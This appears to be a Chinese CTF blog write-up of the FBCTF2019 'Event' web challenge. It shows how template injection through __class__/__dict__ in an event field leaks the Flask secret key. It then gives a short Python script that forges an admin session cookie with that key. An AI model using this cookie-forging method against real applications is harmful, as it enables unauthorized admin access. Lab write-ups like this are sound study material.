---
title: '[FBCTF2019]Event'
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/41414542.jpg'
authorAbout: steamID：888007034
authorDesc: Blizzard：TroyeSivan#51769
categories: 技术
comments: true
date: 2021-01-29 15:07:17
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1127195.jpg
---

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210129150950.png)

随便注册个号（admin不行），试了下ssti不行。访问/flag需要admin的身份，所以寻找一下判断的标准是啥，首先抓包看下cookie之类的：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210129151206.png)

果然有，估计是要伪造user那里的东西，但是加密方式和密钥均未知。
卡住了，于是回头看之前那个可能是ssti的点，只有通过ssti读取密钥伪造cookie才有解，所以一定是存在ssti的。

通过测试，使用__class__或者__dict__在event_important处可以爆出相关内容

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210129153702.png)

得到密钥，接下来伪造就行了：

flask原理：json->zlib->base64后的源字符串 . 时间戳 . hmac签名信息

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210129155614.png)

exp：
    from flask import Flask
    from flask.sessions import SecureCookieSessionInterface
    
    app = Flask(__name__)
    app.secret_key = b'fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y'
    
    session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)

    @app.route('/')
    def index():
        print(session_serializer.dumps("admin"))

    index()